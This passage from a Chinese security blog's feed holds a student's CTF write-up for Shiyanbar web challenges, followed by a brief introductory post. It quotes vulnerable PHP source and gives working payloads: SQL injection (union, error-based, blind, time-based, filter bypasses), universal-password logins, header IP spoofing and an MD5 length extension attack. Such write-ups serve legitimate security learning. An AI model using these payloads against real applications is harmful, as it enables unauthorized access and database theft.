granted!&lt;/p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li></ul><p>明明看懂了   就是不会啊啊啊啊<br>题目首先让你字符串不能包含hackerDJ这个关键字   但是后来经过url解码后  又要与这个关键字相等<br>注意注意  知识点<br><strong>url编码是指   %  加上字符的16进制编码  所有不是只有特殊字符才有url编码  其实所有的字符都有url编码    只是通常浏览器只会给几个特殊字符编码 所以我们可以把hackerDJ 全编码了  但是没有必要  编码其中一个就够了  但是要知道  当你传get参数的时候  浏览器会先弄解码一次   所以你需要两次编码。。<br>所以payload  ?id=h%2561ckerDJ</strong></p><ul><li><h4 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h4><p><img src="/2019/05/22/实验吧刷题记录/5.png" alt><br>可以说提示很明显了 让我们改个请求头<br>首先让来源为英国   当然是修改<strong>access-language</strong>  开始我还以为是en-UK<br>结果。。是en-gb<br>接下来说让我们下载.net framework 9.9<br>官方资料：<br><img src="/2019/05/22/实验吧刷题记录/6.png" alt><br>也就是说我们user-agent里要有.NET CRL 9.9<br>然后下面让我们用IE  最终<br><strong>user-agent：<br>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.0 ;.NET CLR 9.9)</strong><br>注意那个分号。。必须有的</p></li><li><h4 id="once-More"><a href="#once-More" class="headerlink" title="once More"></a>once More</h4><p>这个题挺水的 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999)</span><br><span class="line">    &#123;</span><br><span class="line">        if (strpos ($_GET[&apos;password&apos;], &apos;*-*&apos;) !== FALSE)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&apos;Flag: &apos; . $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            echo(&apos;&lt;p&gt;*-* have not been found&lt;/p&gt;&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li></ul><p>看源码 绕过ereg挺简单的  空字节截断就行了<br>然后满足长度小于8（注意%00是长度为1）  所以用到科学计数法  科学计数法真的是数学类的一个bug 然后还有满足<code>*-*</code>是它的子串<br>这不就简单了？  直接                  <strong>9e9%00<code>*-*</code></strong></p><ul><li><h4 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h4>这个题挺简单的  在你刷新的时候  响应头有一段base64编码的东西  解码后发现让你去发生post请求  并带上它给你的某个随机数<br>但是速度要很才行  显然就是写脚本了<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = &quot;http://ctf5.shiyanbar.com/web/10/10.php&quot;</span><br><span class="line">r = base64.b64decode(requests.get(url).headers[&apos;flag&apos;])[25:]</span><br><span class="line">result = requests.post(url,data=&#123;&apos;key&apos;:r&#125;).text</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure></li></ul><p>脚本没什么稀奇的  主要在于base64解码的方法  涨姿势了</p><ul><li><h4 id="程序逻辑漏洞"><a href="#程序逻辑漏洞" class="headerlink" title="程序逻辑漏洞"></a>程序逻辑漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">welcome to simplexue</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">        $conn = mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;);</span><br><span class="line">        mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">        if ($conn-&gt;connect_error) &#123;</span><br><span class="line">                die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql = &quot;select pw from php where user=&apos;$user&apos;&quot;;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">        printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">        exit();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">//echo $row[&quot;pw&quot;];</span><br><span class="line">  </span><br><span class="line">  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">        echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li></ul><p>唉  这个题不应该不会的  但是有个知识点确实不清楚<br>首先我们F12拿到源码<br>看源码可知  user毫无过滤地拿去查询了  所以如果用1’ or 1=’1  肯定会返回pw  但是不知道具体值<br>我刚开始想到是就这样，然后strcasecmp函数用数组去绕过 但是失败了<br>不知道为什么  然后知识点来了<br><strong>select pw from php where user=’xxxx’ union select 1; 会返回 {‘pw’:1}</strong><br>我真是才知道这么神奇<br>既然这样  payload就出来了<br><strong>user=1’ union select md5(1)#&amp;pass=1</strong><br>很不错的思路  也是知道了这个知识点。</p><ul><li><h4 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h4>终于算是自己独立完成的难度为难的题了   虽然其实挺简单的<br>首先看源代码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function GetIP()&#123;</span><br><span class="line">if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;]))</span><br><span class="line">    $cip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];</span><br><span class="line">else if(!empty($_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]))</span><br><span class="line">    $cip = $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];</span><br><span class="line">else if(!empty($_SERVER[&quot;REMOTE_ADDR&quot;]))</span><br><span class="line">    $cip = $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">else</span><br><span class="line">    $cip = &quot;0.0.0.0&quot;;</span><br><span class="line">return $cip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$GetIPs = GetIP();</span><br><span class="line">if ($GetIPs==&quot;1.1.1.1&quot;)&#123;</span><br><span class="line">echo &quot;Great! Key is *********&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;错误！你的IP不在访问列表之内！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li></ul><p><strong>其实这是大多数服务器获取我们ip的方式<br>这个让我们伪造ip为1.1.1.1<br>怎么说呢  我以前只知道x-forwarded-for头<br>这个的考点是HTTP_CLIENT_IP  HTTP_X_FORWARDED_FOR  REMOTE_ADDR来获取用户的真实ip<br>然而 client-ip   x-forwarded-ip   却是可以通过修改请求头实现的  但是它不随代理二发生改变<br>但是remote_addr却是服务器自己实现的  不能修改请求头  但是会随着代理而变化<br>所以看你相信哪个了  一般统计投票  就用remote_addr  但是如果统计访客量  为了防止别人使用代理 反而可以用client-ip 或  x-forwarded-ip<br>但是由于先判断 HTTP_CLIENT_IP   与HTTP_X_FORWARDED_FOR   所以我们随便伪造一个就行啦</strong><br>但是基于此  必须弄懂各种代理的原理。</p><p>21、让我进去<br>这个题目居然是中等。。不过，我终于会一个不同于通用漏洞的装逼漏洞点了——哈希长度扩展攻击<br>先写题解<br>看响应头。。发现才cookie头有点东西<br><code>Set-Cookie: sample-hash=571580b26c65f306376d4f64e53cb5c7;source=0;</code><br>这个hash碰撞了一下  没撞出来<br>反倒是这个source有点东西  把它改成1  果然源码出现了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;</span><br><span class="line">$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!</span><br><span class="line"></span><br><span class="line">$username = $_POST[&quot;username&quot;];</span><br><span class="line">$password = $_POST[&quot;password&quot;];</span><br><span class="line"></span><br><span class="line">if (!empty($_COOKIE[&quot;getmein&quot;])) &#123;</span><br><span class="line">    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123;</span><br><span class="line">        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">            die (&quot;The flag is &quot;. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        die (&quot;You are not an admin! LEAVE.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line">if (empty($_COOKIE[&quot;source&quot;])) &#123;</span><br><span class="line">    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if ($_COOKIE[&quot;source&quot;] != 0) &#123;</span><br><span class="line">        echo &quot;&quot;; // This source code is outputted here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个源码还是挺好懂得 需要提交一个cookie 叫做getmein  这个getmein 需要等于md5($secret . urldecode($username . $password)<br>但是我们不知道$secret呀  嗯 看下面 好像返回的的cookie里有一个sample-hash  值为secret+”adminadmin”的MD5<br>所以我们首先想到让$password=admin  但是它又不让你等于<br>这个就有点尴尬了  怎么办呢？我们怎么绕过这个secret呢？<br>这个就要用到hash长度扩展攻击了<br>hash都是散列加密   每64位组成一个散列组  这个组得到的结果  作为下一组的初始参数   最后一组被计算完后  得到的结果即为整个串的md5值<br>中间还有一个叫补位的操作  也就是你除64除不尽啊  这时最后多出的一组会被0x00补到56位（补位开始时要先一个0x80再接很多0x00）  然后最后8位显示非补位的有效位数  也就是补位前有几个比特<br>记住  是比特  不是字节<br>明白原理了   就讲漏洞<br>现在我知道MD5($secret+”adminadmin”)的值  但是不知道secret的值  我要绕过它<br>好的  操作来了  我输入的password不能为admin  但是我输入payload:<br>admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00admin<br>解释一下  这是手动补位  再加上一个admin  这个admin可以换成其他值  它会作为第二个散列组  被第一个散列组加密<br>而第一个散列组的值已知了  也就是我们的MD5($secret+”adminadmin”) =571580b26c65f306376d4f64e53cb5c7<br>所以我们把它作为初始参数   再对”admin”进行MD5加密<br>这就得到了getmein的值（注意  这个改变初始参数的话  我们得用md5加密的原生代码的脚本  像封装的太完美的函数  是改变不了的 我在网上下了一个）<br>完美<br>总结一下  哈希长度扩展攻击的作用在于绕过sult<br>其实实际用处我觉得不大<br>现实生活中哪有这样刁钻的环境。。。。</p><ul><li><h4 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h4>源码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// code by SEC@USTC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &apos;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;charset&quot; content=&quot;gbk&quot;&gt;&lt;/head&gt;&lt;body&gt;&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$URL = $_SERVER[&apos;REQUEST_URI&apos;];</span><br><span class="line">//echo &apos;URL: &apos;.$URL.&apos;&lt;br/&gt;&apos;;</span><br><span class="line">$flag = &quot;CTF&#123;???&#125;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$code = str_replace($flag, &apos;CTF&#123;???&#125;&apos;, file_get_contents(&apos;./index.php&apos;));</span><br><span class="line">$stop = 0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//这道题目本身也有教学的目的</span><br><span class="line">//第一，我们可以构造 /indirection/a/../ /indirection/./ 等等这一类的</span><br><span class="line">//所以，第一个要求就是不得出现 ./</span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;./&apos;) !== FALSE)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 1;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//第二，我们可以构造 \ 来代替被过滤的 /</span><br><span class="line">//所以，第二个要求就是不得出现 ../</span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;\\&apos;) !== FALSE)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 2;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//第三，有的系统大小写通用，例如 indirectioN/</span><br><span class="line">//你也可以用?和#等等的字符绕过，这需要统一解决</span><br><span class="line">//所以，第三个要求对可以用的字符做了限制，a-z / 和 .</span><br><span class="line">$matches = array();</span><br><span class="line">preg_match(&apos;/^([0-9a-z\/.]+)$/&apos;, $URL, $matches);</span><br><span class="line">if($flag &amp;&amp; empty($matches) || $matches[1] != $URL)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 3;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//第四，多个 / 也是可以的</span><br><span class="line">//所以，第四个要求是不得出现 //</span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;//&apos;) !== FALSE)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 4;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//第五，显然加上index.php或者减去index.php都是可以的</span><br><span class="line">//所以我们下一个要求就是必须包含/index.php，并且以此结尾</span><br><span class="line">if($flag &amp;&amp; substr($URL, -10) !== &apos;/index.php&apos;)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 5;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//第六，我们知道在index.php后面加.也是可以的</span><br><span class="line">//所以我们禁止p后面出现.这个符号</span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;p.&apos;) !== FALSE)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 6;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//第七，现在是最关键的时刻</span><br><span class="line">//你的$URL必须与/indirection/index.php有所不同</span><br><span class="line">if($flag &amp;&amp; $URL == &apos;/indirection/index.php&apos;)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 7;        //Pass</span><br><span class="line">&#125;</span><br><span class="line">if(!$stop) $stop = 8;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &apos;Flag: &apos;.$flag;</span><br><span class="line">echo &apos;&lt;hr /&gt;&apos;;</span><br><span class="line">for($i = 1; $i &lt; $stop; $i++)</span><br><span class="line">    $code = str_replace(&apos;//Pass &apos;.$i, &apos;//Pass&apos;, $code);</span><br><span class="line">for(; $i &lt; 8; $i++)</span><br><span class="line">    $code = str_replace(&apos;//Pass &apos;.$i, &apos;//Not Pass&apos;, $code);</span><br><span class="line"></span><br><span class="line">echo highlight_string($code, TRUE);</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;/body&gt;&lt;/html&gt;&apos;;</span><br></pre></td></tr></table></figure></li></ul><p>还不错的样子<br>反正让你绕过它设置的关卡  然后输入一个url<br>然后我就试了一下<br><strong>index.php/index.php</strong><br>。。。。。。。居然成功了  果然水题</p><ul><li><h4 id="加了料的报错注入"><a href="#加了料的报错注入" class="headerlink" title="加了料的报错注入"></a>加了料的报错注入</h4>  这个加了料的报错注入。。本来应该挺难的，但是出现很多非预期解了，我是没做出来。。一是知识点欠缺  二是脑洞不够大</li></ul><p>首先可以看到源代码中有一句<br><strong><code>&lt;!-- $sql=&quot;select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;&quot;; --&gt;</code></strong></p><p>把语句亮出来了<br>首先，如果用我此时知识点内的做法是（第一步一定要看sql注入那些关键字被过滤了）<br>先看过滤  union = substr - # 被过滤掉了<br>其中 username  把(  ,  )过滤掉了<br>password把 updatexml ,extratexml等报错函数过滤了<br>这样咋办呢？<br>这就是脑洞了<br>我们构造<br><strong><code>username=1&#39; and updatexml/*&amp;password=*/(1,concat(0x24,(select database()),0x24),1) and &#39;1</code></strong></p><p>看到没有，这就是脑洞，害怕了吧<br>这应该是作者的本意  但是作者忘了一个函数 exp()<br>这个函数我也是第一次知道<br><strong><code>username=1&amp;password=1&#39; or exp(~(select*from(select database())a)) or &#39;1</code></strong></p><p>这个就是exp报错的基本用法  这个应该是出题人的疏忽了<br>当然，所有的题目都不应该只有一个思路<br>有的大佬强如老狗，楞是弄出两种思路<br>看吧，盲注！<br>= 被过滤了  没有关系  我们可以用regexp  in between &lt; &gt; &lt;&gt; like 等绕过，当然最舒服的还是regexp 正则了<br>1’ or (select database()) regexp ‘^a|</p><ul><li><h4 id="认真一点"><a href="#认真一点" class="headerlink" title="认真一点"></a>认真一点</h4>这个直接就是一个sql注入，首先一波fuzz<br>发现检测%  ^  =  ,  # 等等符号会直接报警告<br>由于没有报错回显  所以报错也没有用<br>除了上面的符号  还有一些符号也进行了过滤（但只是过滤）<br>or  改成oorr就行<br>space  用/** /也被过滤  只有%0a比较好使<br>然后观察到2’%0aoorr%0a’1居然成功了<br>直接盲注<br>用regexp   但是^被过滤了，不好注入，但是我们可以用$从后往前盲猜</li></ul><p><strong><code>id=2&#39;%0aoorr%0adatabase()%0aregexp%0a&#39;ctf_sql_bool_blind$</code></strong></p><p>就这样猜出库名<br>但是猜表名就出问题了<br>为啥呢？ 因为group_concat函数其实有一个参数叫 aseparator 代表用什么来分割各个元素，默认是逗号 但是这里逗号被过滤了   所以我们这样<br><strong>group_concat(table_name separatoorr ‘@’)</strong><br>就可以以@来分割了<br>但是这个最坑的是，列名里面居然有一个$  这个刚好是一个特殊符号。。。代表结尾。。当然，我们可以用[ ] 来干掉元字符的特殊属性<br>这个时候才发现regexp的缺点  一旦出现特殊字符，就不好下手了<br>也可以正常盲注，这个盲注的难点在于绕过逗号了<br>不过在mid函数中有for from绕过逗号的姿势</p><ul><li><h4 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you"></a>who are you</h4><p>首先提示说，我要把攻击我的人都放到db里面去，既然是db里面，就一定是sql注入了<br>然后可以说没有任何正确或错误的回显<br>所以先想到时间盲注<br>先猜测1’ and sleep(5)  or 1=’1 就暂停5秒，说明存在延时注入<br>但是在注入过程中发现一个问题就是逗号被过滤了，所以我们需要绕过逗号的过滤<br>基于时间的盲注：<strong><code>case when xxx then sleep() else xxxx end</code></strong><br>这个就是盲注逗号绕过<br>加上 <strong><code>mid(data from 1 for 1)</code></strong><br>就可以绕过逗号啦</p></li><li><h4 id="登陆一下好吗？"><a href="#登陆一下好吗？" class="headerlink" title="登陆一下好吗？"></a>登陆一下好吗？</h4><p>这个其实考的就是万能密码了<br>首先看过滤<br><code>/**/  select -- # union or ||  / *</code><br>全部过滤掉了<br>没有报错回显  延时注入也不好注入<br>我是真没想到还能这样构造万能密码。。。。<br><strong>username=1’=’0&amp;password=1’=’0</strong><br>也就是 <code>select * from admin where username=&#39;1&#39;=&#39;0 &#39;and password=&#39;1&#39;=&#39;0 &#39;</code><br>这是万能密码之一呀  username=1返回0 刚好=0   passWord=‘1’ 返回0  =0<br>真的强  以后还是得多捋一捋</p></li></ul><p>外加一个操作<br>当所有username里没有开头是非零数的字符串，username=0相当于查全部数据.<br>所以我们构造出username=0就行了<br>接下来这个操作就比较开脑洞了，构造下面这个post请求：<br><strong>username=\&amp;password=^’aaa</strong><br>这样就构造出了<br><code>select * from user where username = &#39; \&#39; and password = &#39;^&#39;aaa&#39;</code><br>用\把单引号过滤掉，也就是\’ and password = 成为一个字符串<br>然后异或’aaa’  0异或0 =0<br>所以变成了username = 0</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是我早年刷的实验吧的题了，刚入门的小菜鸡，做题只会看wp。。。&lt;br&gt;主要有两点，这些题我分两批刷的，第一次是真的纯小白，刚学完php就硬钢&lt;br&gt;第二次就是脚本小子了，已经刷完了sqli 并且系统的学了一点xss,ssrf,csrf,xxe之类的基础漏洞了，然后开始钢&lt;br&gt;然后这些以前是写在印象笔记里给自己看的。。写的很真性情就是了，有时间我会改成他人可读的版本的&lt;br&gt;正在刷实验吧的同学可以借此少花一点松果，其他的。。。用处不大吧&lt;/p&gt;
    
    </summary>
    
    
      <category term="-刷题记录" scheme="http://yoursite.com/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>hello world</title>
    <link href="http://yoursite.com/2019/05/22/hello-world/"/>
    <id>http://yoursite.com/2019/05/22/hello-world/</id>
    <published>2019-05-22T11:16:38.000Z</published>
    <updated>2019-05-22T11:39:59.845Z</updated>
    
    <content type="html"><![CDATA[<p>   本来早就说要搭建自己的博客，其实确实也早就搭建好了，但是一直懒得配置主题文件，也懒得学markdown语法…所以就搁置了。</p><p>   今天总算是功德圆满，撒花✿✿ヽ(°▽°)ノ✿。<br>   <a id="more"></a><br>   为什么搭博客呢？</p><ul><li>首先还是因为装x了，因为我看基本上web 手都有自己的博客，赶紧搭一个自己的，不然都不好意思说自己是web狗了</li><li>第二其实还是想和大家分享一下我的一点思想，以前都是写印象笔记给自己看，觉得能把别人说懂才是真的自己搞懂了吧</li><li><p>如果能因为博客结识到志同道合的朋友就更好啦</p><p>介绍一下自己吧，目前河南某菜鸡学校读大二，目前是一名ctf 的web手（目前比较菜，但是相信以后会变强的），偶尔也喜欢玩硬件，但是只是惊艳于物理攻击的效果强大，并没有很深入的钻研。未来不一定想在ctf上有很大建树，更希望自己的web安全水平跻身大佬行列。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;   本来早就说要搭建自己的博客，其实确实也早就搭建好了，但是一直懒得配置主题文件，也懒得学markdown语法…所以就搁置了。&lt;/p&gt;
&lt;p&gt;   今天总算是功德圆满，撒花✿✿ヽ(°▽°)ノ✿。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Blind</title>
    <link href="http://yoursite.com/2019/03/25/Blind/"/>
    <id>http://yoursite.com/2019/03/25/Blind/</id>
    <published>2019-03-25T13:22:13.000Z</published>
    <updated>2019-03-25T13:22:13.271Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
</feed>
